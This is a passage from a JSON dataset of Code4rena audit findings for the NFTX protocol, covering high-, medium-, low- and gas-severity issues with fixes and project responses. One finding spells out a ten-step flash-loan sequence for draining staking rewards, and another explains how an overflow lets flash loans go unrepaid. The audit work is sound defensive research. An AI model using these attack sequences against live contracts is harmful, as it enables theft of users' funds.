      "content": "\nA malicious receiver can cause another receiver to lose out on distributed fees by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract. This causes the fee distributor to double spend the `amountToSend` because the contract incorrectly assumes the returned data is truthful.\n\n`NFTXFeeDistributor.sol`:\n```solidity\nLine 163: (bool success, bytes memory returnData) = address(_receiver.receiver).call(payload);\n```\nRecommend that you don't trust return data from externally called contracts. Only utilize whether the transaction succeeds to determine if the treasury fallback should be called.\n```\nLine 165: if (!success) {\n```\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/69#issuecomment-845681145):**\n > Nice catch!\n\n",
      "summary": "\nThe bug report discusses a vulnerability in the `NFTXFeeDistributor.sol` contract, where a malicious receiver can cause another receiver to lose out on distributed fees. This is done by returning `false` for `tokensReceived` when `receiveRewards` is called on their receiver contract. This leads to the fee distributor double spending the `amountToSend` because the contract assumes the returned data is truthful. The report recommends not trusting return data from externally called contracts and only using the success of the transaction to determine if the treasury fallback should be called. The bug has been confirmed and a fix is needed to prevent this vulnerability.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/69",
      "tags": [],
      "finders": []
    },
    {
      "id": "42186",
      "title": "[M-07] Tokens can get stuck in `NFTXMintRequestEligibility`",
      "impact": "MEDIUM",
      "content": "\nWhen dealing with ERC721 (instead of 1155) the amounts array is ignored, which leads to an issue.\n\nUser can call `NFTXMintRequestEligibility.requestMint` for an ERC721 with `amounts[i] = 0`.\nThe `ERC721.transferFrom` is still executed but user cannot `reclaimRequestedMint` later and the NFT is stuck as it checks (`amounts[i] > 0`).\n\n\nTokens can get stuck.\nAlso, subscribers to `Request` event could be tricked by specifying `amounts[i] > 1` in the ERC721 case, as only one token was transferred, but the amount multiple quantities get logged.\n\nRecommend that `requestMint`: Check `amounts[i] == 1` in ERC721 case, `amounts[i] > 0` in 1155 case.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/59)**\n\n",
      "summary": "\nThe bug report discusses an issue with ERC721 tokens, specifically with the `amounts` array being ignored. This can cause problems when calling the `NFTXMintRequestEligibility.requestMint` function, as the `ERC721.transferFrom` function is still executed even if `amounts[i]` is set to 0. This means that the user cannot reclaim the requested mint later and the token becomes stuck. Additionally, subscribers to the `Request` event can be tricked by specifying `amounts[i] > 1` in the ERC721 case, even though only one token was transferred. The report recommends checking `amounts[i] == 1` for ERC721 tokens and `amounts[i] > 0` for 1155 tokens in the `requestMint` function to avoid these issues. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/59",
      "tags": [],
      "finders": []
    },
    {
      "id": "42185",
      "title": "[M-05] Unbounded iteration in `NFTXEligiblityManager.distribute` over `_feeReceivers`",
      "impact": "MEDIUM",
      "content": "\n`NFTXEligiblityManager.distribute` iterates over all `_feeReceivers`. If the number of `_feeReceivers` gets too big, the transaction's gas cost could exceed the block gas limit and make it impossible to call `distribute` at all.\n\nRecommend keeping the number of `_feeReceivers` small.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/47)**\n\n",
      "summary": "\nThe NFTXEligiblityManager.distribute function has a bug that can cause issues when there are too many fee receivers. This can lead to a high gas cost that exceeds the block gas limit, making it impossible to call the function. To avoid this issue, it is recommended to keep the number of fee receivers small.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/47",
      "tags": [],
      "finders": []
    },
    {
      "id": "42184",
      "title": "[M-02] Use `safeTransfer`/`safeTransferFrom` consistently instead of `transfer`/`transferFrom`",
      "impact": "MEDIUM",
      "content": "\nIt is good to add a `require()` statement that checks the return value of token transfers, or to use something like OpenZeppelin’s `safeTransfer`/`safeTransferFrom` unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nWhile most places use a `require` or `safeTransfer`/`safeTransferFrom`, there are three missing cases in the withdrawal of staking token and rescue of arbitrary tokens sent to the `FeeDistributor` contract.\n\nReference this similar medium-severity finding from [Consensys Diligence Audit of Fei Protocol](https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call).\n\nRecommend using `safeTransfer`/`safeTransferFrom` or `require()` consistently.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/79)**\n\n",
      "summary": "\nThe bug report highlights the importance of using `require()` or `safeTransfer`/`safeTransferFrom` statements when transferring tokens to avoid silent failures and incorrect token accounting. It also points out three instances in the `FeeDistributor` contract where these statements are missing, which can lead to issues with withdrawing staking tokens and rescuing arbitrary tokens. The report recommends consistently using these statements and references a similar finding from a previous audit of Fei Protocol. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/79",
      "tags": [],
      "finders": []
    },
    {
      "id": "42183",
      "title": "[H-04] `NFTXLPStaking` Is Subject To A Flash Loan Attack That Can Steal Nearly All Rewards/Fees That Have Accrued For A Particular Vault",
      "impact": "HIGH",
      "content": "\nThe LPStaking contract does not require that a stake be locked for any period of time. The LPStaking contract also does not track how long your stake has been locked. So an attacker Alice can stake, claim rewards, and unstake, all in one transaction. If Alice utilizes a flash loan, then she can claim nearly all of the rewards for herself, leaving very little left for the legitimate stakers.\n\nThe fact that the `NFTXVaultUpgradeable` contract contains a native `flashLoan` function makes this attack that much easier, although it would still be possible even without that due to flashloans on Uniswap, or wherever else the nftX token is found.\n\nSince a flash loan will easily dwarf all of the legitimate stakers' size of stake, the contract will erroneously award nearly all of the rewards to Alice.\n\n1.  Wait until an NFTX vault has accrued any significant amount of fees/rewards\n2.  `FlashLoanBorrow` a lot of ETH using any generic flash loan provider\n3.  `FlashLoanBorrow` a lot of nftx-vault-token using `NFTXVaultUpgradeable.flashLoan()`\n4.  Deposit the ETH and nftx-vault-token's into Uniswap for Uniswap LP tokens by calling `Uniswap.addLiquidity()`\n5.  Stake the Uniswap LP tokens in `NFTXLPStaking` by calling `NFTXLPStaking.deposit()`\n6.  Claim nearly all of the rewards that have accrued for this vault due to how large the flashLoaned deposit is relative to all of the legitimate stakes by calling `NFTXLPStaking.claimRewards()`\n7.  Remove LP tokens from `NFTXLPStaking` by calling `NFTXLPStaking.exit()`;\n8.  Withdraw ETH and nftx-vault-token's by calling `Uniswap.removeLiquidity()`;\n9.  Pay back nftx-vault-token flash loan\n10. Pay back ETH flash loan\n\nSee [GitHub issue page](https://github.com/code-423n4/2021-05-nftx-findings/issues/88) for an in-depth  example.\n\nRecommend requiring that staked LP tokens be staked for a particular period of time before they can be removed. Although a very short time frame (a few blocks) would avoid flash loan attacks, this attack could still be performed over the course of a few blocks less efficiently. Ideally, you would want the rewards to reflect the product of the amount staked and the duration that they've been staked, as well as having a minimum time staked.\n\nAlternatively, if you really want to allow people to have the ability to remove their stake immediately, then only allow rewards to be claimed for stakes that have been staked for a certain period of time. Users would still be able to remove their LP tokens, but they could no longer siphon off rewards immediately.\n\n**[0xKiwi (NFTX) disputed](https://github.com/code-423n4/2021-05-nftx-findings/issues/88#issuecomment-845695223):**\n > After looking at the code, this is not possible. The dividend token code takes into consideration the current unclaimed rewards and when a deposit is made that value is deducted.\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/88#issuecomment-848325710):**\n > @0xKiwi do you mind showing where in code that occurs?\n\n",
      "summary": "\nThe LPStaking contract allows users to stake their tokens and claim rewards, but it does not require staked tokens to be locked for a period of time. This means that an attacker can stake, claim rewards, and unstake all in one transaction, leaving little rewards for legitimate stakers. This can be made easier by using a flash loan, which can be obtained through the NFTXVaultUpgradeable contract. This allows the attacker to stake a large amount of tokens and claim most of the rewards, leaving little for others. To fix this, it is recommended to require staked tokens to be locked for a certain period of time before they can be removed, or to only allow rewards to be claimed for tokens that have been staked for a certain period of time.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/88",
      "tags": [],
      "finders": []
    },
    {
      "id": "42182",
      "title": "[H-03] `getRandomTokenIdFromFund` yields wrong probabilities for ERC1155",
      "impact": "HIGH",
      "content": "\n`NFTXVaultUpgradeable.getRandomTokenIdFromFund` does not work with ERC1155 as it does not take the deposited `quantity1155` into account.\n\nAssume `tokenId0` has a count of 100, and `tokenId1` has a count of 1.\nThen `getRandomId` would have a pseudo-random 1:1 chance for token 0 and 1 when in reality it should be 100:1.\n\nThis might make it easier for an attacker to redeem more valuable NFTs as the probabilities are off.\n\nRecommend taking the quantities of each token into account (`quantity1155`) which probably requires a design change as it is currently hard to do without iterating over all tokens.\n\n**[0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/56)**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/56#issuecomment-848266608):**\n > Marking this as high risk as an attacker can weed out high-value NFTs from a vault putting other users funds at risk\n\n",
      "summary": "\nThe `NFTXVaultUpgradeable.getRandomTokenIdFromFund` function is not working correctly with ERC1155 tokens. This means that when trying to randomly select a token, it does not take into account the quantity of tokens that have been deposited. This can lead to an unfair distribution of tokens, making it easier for an attacker to redeem more valuable NFTs. This bug has been acknowledged by the developer and a design change may be needed to fix it. A judge has marked this as a high-risk issue as it could put users' funds at risk.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/56",
      "tags": [],
      "finders": []
    },
    {
      "id": "42181",
      "title": "[H-02] `distribute` DoS on missing `receiveRewards` implementation",
      "impact": "HIGH",
      "content": "\n`NFTXEligiblityManager._sendForReceiver` should check `returnData.length == 1` before decoding. Otherwise, if it returns no return data, the `abi.decode` call will revert and with it the whole `distribute` function .\n\nA single poorly implemented `feeReceiver` can break the whole `distribute` function and allow a denial of service by reverting the transaction.\n\nRecommend changing to: `bool tokensReceived = returnData.length == 1 && abi.decode(returnData, (bool));`.\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/46):**\n\n**[cemozer (Judge) commented](https://github.com/code-423n4/2021-05-nftx-findings/issues/46#issuecomment-848259748):**\n > Marking this as high risk because one nefarious feeReceiver can in fact deny other users to receive their fees\n\n",
      "summary": "\nThe report discusses a bug in the NFTXEligibilityManager contract that could potentially cause a denial of service by reverting the transaction. This is due to a poorly implemented `feeReceiver` function that can break the `distribute` function. The suggested solution is to change the code to check for the length of the return data before decoding it, and only proceed if the length is equal to 1. The severity of this bug has been marked as high risk because it could potentially prevent users from receiving their fees.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/46",
      "tags": [],
      "finders": []
    },
    {
      "id": "42180",
      "title": "[H-01] Missing overflow check in `flashLoan`",
      "impact": "HIGH",
      "content": "\n`ERC20FlashMintUpgradeable.flashLoan` does not check for an overflow when adding the fees to the `flashloan` amount.\nThe functionality might have been copied from https://eips.ethereum.org/EIPS/eip-3156 but this one already has overflow checks as it uses solidity 0.8.0. This leads to an issue where the attacker does not need to pay back the `flashloan` as they will burn 0 tokens:\n\n```solidity\n_burn(address(receiver), amount + fee);\n```\nThey end up with a huge profit. (Luckily, this is currently not exploitable as the fee is set to 0 so there's no possibility to overflow. However, if governance decides to change the flashloan fee, flashloans can be taken without having to repay them). Recommend using `SafeMath`.\n\n**[0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/43#issuecomment-845566980):**\n > Upgraded to 0.8.x.\n\n",
      "summary": "\nThe function `ERC20FlashMintUpgradeable.flashLoan` has a bug where it does not properly check for an overflow when adding fees to the flashloan amount. This can potentially lead to an issue where attackers can take flashloans without having to pay them back, resulting in a large profit. The bug may have been copied from a similar function, but that one already has overflow checks. The current fee is set to 0, so the bug is not exploitable at the moment, but if the fee is changed, it could become a problem. It is recommended to use `SafeMath` to prevent this bug from occurring. The bug has been confirmed by a developer and the code has been upgraded to fix it. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/43",
      "tags": [],
      "finders": []
    },
    {
      "id": "4034",
      "title": "[G-06] Unused variables",
      "impact": "GAS",
      "content": "\nThere are unused variables in contract `NFTXVaultUpgradeable` (string public description) and in contract `NFTXMintRequestEligibility` (address public manager). Recommend deleting unused variables to reduce the deployment costs.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/39",
      "tags": [],
      "finders": []
    },
    {
      "id": "4033",
      "title": "[G-05] Revert inside a loop",
      "impact": "GAS",
      "content": "\nHere you have more info: https://gist.github.com/alexon1234/a2275d1724ce2122d36bc555e46a25c1\n\n**- [0xKiwi (NFTX) acknowledged](https://github.com/code-423n4/2021-05-nftx-findings/issues/97)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/97",
      "tags": [],
      "finders": []
    },
    {
      "id": "4032",
      "title": "[G-04] Gas optimization for StakingTokenProvider.nameForStakingToken",
      "impact": "GAS",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\n`StakingTokenProvider.nameForStakingToken`: `if (keccak256(abi.encode(_pairedPrefix)) == keccak256(abi.encode(address(0)))) ` can be simplified to `if(bytes(_pairedPrefix).length== 0)`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/49",
      "tags": [],
      "finders": []
    },
    {
      "id": "4031",
      "title": "[G-03] Change function visibility from public to external",
      "impact": "GAS",
      "content": "\nVarious functions across contracts are never called from within contracts yet are declared public. Their visibility can be made external to save gas.\n\nAs described in https://mudit.blog/solidity-gas-optimization-tips/:\n> “For all the public functions, the input parameters are copied to memory automatically, and it costs gas. If your function is only called externally, then you should explicitly mark it as external. External function’s parameters are not copied into memory but are read from `calldata` directly. This small optimization in your solidity code can save you a lot of gas when the function input parameters are huge.”\n\nRecommend changing function visibility from public to external.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/64)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/64",
      "tags": [],
      "finders": []
    },
    {
      "id": "4030",
      "title": "[G-02] Unused events",
      "impact": "GAS",
      "content": "\nUnused events increase contract size at deployment. Multiple events in `NFTXMintRequestEligibility.sol` listed on the issue page. Recommend removing unused events or emit at appropriate places.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/63)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/63",
      "tags": [],
      "finders": []
    },
    {
      "id": "4029",
      "title": "[G-01] Unused storage variables",
      "impact": "GAS",
      "content": "\nUnused storage variables in contracts use up storage slots and increase contract size and gas usage at deployment and initialization. Multiple variables across different contracts including `manager` , `allVaults`, `vaultsForAsset`, and `prevContract`. Recommend removing unused variables.\n\n**- [0xKiwi (NFTX) confirmed](https://github.com/code-423n4/2021-05-nftx-findings/issues/62)**\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/62",
      "tags": [],
      "finders": []
    },
    {
      "id": "4028",
      "title": "[L-10] __Ownable_init will be called twice in multiple Eligibility contracts",
      "impact": "LOW",
      "content": "## Handle\n\na_delamo\n\n\n## Vulnerability details\n\nHere you have more info: https://gist.github.com/alexon1234/43bf4a72a5b06651f04fc8052349ac5a",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/84",
      "tags": [],
      "finders": []
    },
    {
      "id": "4027",
      "title": "[L-09] lack of zero address validation",
      "impact": "LOW",
      "content": "## Handle\n\nJMukesh\n\n\n## Vulnerability details\n\n## Impact\ninit function  like __FeeDistributor__init__() are used to initialize the state variable,  since these state variable are used in many function ,  due to lack of input validation, error in  these state variable can lead to redeployment of contract \n\n## Proof of Concept\nIn NFTXFeeDistributor.sol --> __FeeDistributor__init__()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXFeeDistributor.sol#L35\n\nin NFTXLPStaking.sol --> __NFTXLPStaking__init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXLPStaking.sol#L35\n\nin NFTXVaultUpgradeable.sol -- > __NFTXVault_init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/NFTXVaultUpgradeable.sol#L100\n\nin StakingTokenProvider.sol --> __StakingTokenProvider_init()\n\nhttps://github.com/code-423n4/2021-05-nftx/blob/main/nftx-protocol-v2/contracts/solidity/StakingTokenProvider.sol#L23\n\n## Tools Used\nslither\n\n## Recommended Mitigation Steps\n\nadd zero address validation",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/82",
      "tags": [],
      "finders": []
    },
    {
      "id": "4026",
      "title": "[L-08] eligibilityManager is always 0x0",
      "impact": "LOW",
      "content": "## Handle\n\npaulius.eth\n\n\n## Vulnerability details\n\n## Impact\ncontract NFTXVaultFactoryUpgradeable, variable eligibilityManager is never set thus it gets a default value of 0x0. So function deployEligibilityStorage should always fail as the eligibility manager does not exist on address 0x0.\n\n## Recommended Mitigation Steps\nEither add a setter for eligibilityManager or refactor function deployEligibilityStorage to work in such case.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/25",
      "tags": [],
      "finders": []
    },
    {
      "id": "4025",
      "title": "[L-07] Vault’s flash loan not implemented according to EIP-3156",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `NFTXVaultUpgradeable.flashLoan` is not correctly implemented according to  EIP-3156 (but it tries to implement it as it inherits from `IERC3156FlashLenderUpgradeable`).\n\n> \"If successful, flashLoan MUST return true.\" - https://eips.ethereum.org/EIPS/eip-3156\n\nIt misses the return and currently always returns `false`.\n\n## Impact\n\nAlways returning `false` indicates that the flash loan was unsuccessful when in reality it could have been successful.\nThis breaks any contract trying to integrate with it.\n\n\n## Recommended Mitigation Steps\n\nAdd the return statement: `return super.flashLoan(...)`",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/54",
      "tags": [],
      "finders": []
    },
    {
      "id": "4024",
      "title": "[L-06] Unchecked external calls in NFTXLPStaking",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe `emergencyExit`/`emergencyExitAndClaim` functions take the staking and reward tokens as parameters and trust them for the withdrawal.\n\n## Impact\n\nThis does not lead to a critical issue (like being able to withdraw all funds) as one cannot deploy a fake reward smart contract to a `_rewardDistributionTokenAddr` and a random address without a smart contract will fail because of the `dist.balanceOf(msg.sender)` call not returning any data.\nHowever, checking if the distribution token exists is still recommended.\n\n\n## Recommended Mitigation Steps\n\nRequire `isContract(dist)`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/48",
      "tags": [],
      "finders": []
    },
    {
      "id": "4023",
      "title": "[L-05] Inconsistent solidity pragma",
      "impact": "LOW",
      "content": "## Handle\n\nmaplesyrup\n\n\n## Vulnerability details\n\n## Impact\n\nThe source files have different solidity compiler ranges referenced.  This leads to potential security flaws between deployed contracts depending on the compiler version chosen for any particular file.  It also greatly increases the cost of maintenance as different compiler versions have different semantics and behavior.\n\n## Proof of Concept\n\nThis defect has numerous surfaces at https://github.com/code-423n4/2021-05-nftx/tree/main/nftx-protocol-v2/contracts/solidity\n\nDifferent versions of Solidity are used in :\n\t- Version used: ['0.6.8', '>=0.4.22<0.9.0', '>=0.4.24<0.7.0', '>=0.6.0<0.8.0', '>=0.6.2<0.8.0', '^0.6.0', '^0.6.8']\n\t- 0.6.8 (contracts/solidity/NFTXEligiblityManager.sol#2)\n\t- ABIEncoderV2 (contracts/solidity/NFTXEligiblityManager.sol#3)\n\t- ^0.6.8 (contracts/solidity/NFTXFeeDistributor.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXLPStaking.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXVaultFactoryUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/NFTXVaultUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/StakingTokenProvider.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXDeferEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXDenyEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXListEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXMintRequestEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXRangeEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/NFTXUniqueEligibility.sol#3)\n\t- 0.6.8 (contracts/solidity/eligibility/UniqueEligibility.sol#2)\n\t- >=0.6.0<0.8.0 (contracts/solidity/interface/IERC165Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IERC3156Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXEligibility.sol#2)\n\t- 0.6.8 (contracts/solidity/interface/INFTXEligibilityManager.sol#1)\n\t- ^0.6.8 (contracts/solidity/interface/INFTXFeeDistributor.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXLPStaking.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXVault.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/INFTXVaultFactory.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IPrevNftxContract.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IRewardDistributionToken.sol#3)\n\t- 0.6.8 (contracts/solidity/interface/IVaultTokenUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/BeaconProxy.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/proxy/ClonesUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/IBeacon.sol#3)\n\t- >=0.4.24<0.7.0 (contracts/solidity/proxy/Initializable.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/Proxy.sol#3)\n\t- 0.6.8 (contracts/solidity/proxy/UpgradeableBeacon.sol#3)\n\t- 0.6.8 (contracts/solidity/testing/MockStakingProvider.sol#3)\n\t- 0.6.8 (contracts/solidity/testing/MockVault.sol#2)\n\t- ^0.6.0 (contracts/solidity/token/ERC1155HolderUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/ERC20BurnableUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/token/ERC20FlashMintUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/ERC20Upgradeable.sol#3)\n\t- ^0.6.0 (contracts/solidity/token/ERC721HolderUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC1155ReceiverUpgradeable.sol#3)\n\t- >=0.6.2<0.8.0 (contracts/solidity/token/IERC1155Upgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC20Upgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/token/IERC721ReceiverUpgradeable.sol#3)\n\t- >=0.6.2<0.8.0 (contracts/solidity/token/IERC721Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/token/RewardDistributionTokenUpgradeable.sol#2)\n\t- 0.6.8 (contracts/solidity/util/Address.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/ContextUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/EnumerableSetUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/OwnableUpgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/util/PausableUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/ReentrancyGuardUpgradeable.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/SafeERC20Upgradeable.sol#3)\n\t- 0.6.8 (contracts/solidity/util/SafeMathInt.sol#3)\n\t- >=0.6.0<0.8.0 (contracts/solidity/util/SafeMathUpgradeable.sol#3)\n\t- >=0.4.22<0.9.0 (node_modules/hardhat/console.sol#2)\n\n## Tools Used\n\nSlither\n\n## Recommended Mitigation Steps\n\nFix a definite compiler range that is consistent between contracts and upgrade any affected contracts to conform to the specified compiler.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/3",
      "tags": [],
      "finders": []
    },
    {
      "id": "4022",
      "title": "[L-04] Missing usage of SafeMath",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nThe following code does not use SafeMath and can potentially lead to overflows:\n- `NFTXFeeDistributor.distribute`\n- `NFTXFeeDistributor._sendForReceiver`\n\n## Impact\n\nWhile looping through all `_feeReceivers` it could be that a broken vault was whitelisted that allows an attacker to perform an external call and break the invariant that always 1000 tokens are left in the contract.\n\n## Recommended Mitigation Steps\n\nAdd SafeMath to `_sendForReceiver` even though one would expect the math to be safe.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
      "source_link": "https://code4rena.com/reports/2021-05-nftx",
      "github_link": "https://github.com/code-423n4/2021-05-nftx-findings/issues/45",
      "tags": [],
      "finders": []
    },
    {
      "id": "4021",
      "title": "[L-03] Missing parameter validation",
      "impact": "LOW",
      "content": "## Handle\n\n@cmichelio\n\n\n## Vulnerability details\n\n\n## Vulnerability Details\n\nMissing parameter validation for functions:\n- `NFTXEligiblityManager.addModule, updateModule`\n- `NFTXFeeDistributor` all `setter` functions (`setTreasuryAddress`, ...)\n- `NFTXVaultUpgradeable.setManager`\n\n## Impact\n\nSome wallets still default to zero addresses for a missing input which can lead to breaking critical functionality like setting the manager to the zero address and being locked out.\n\n## Recommended Mitigation Steps\n\nValidate the parameters.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "NFTX",
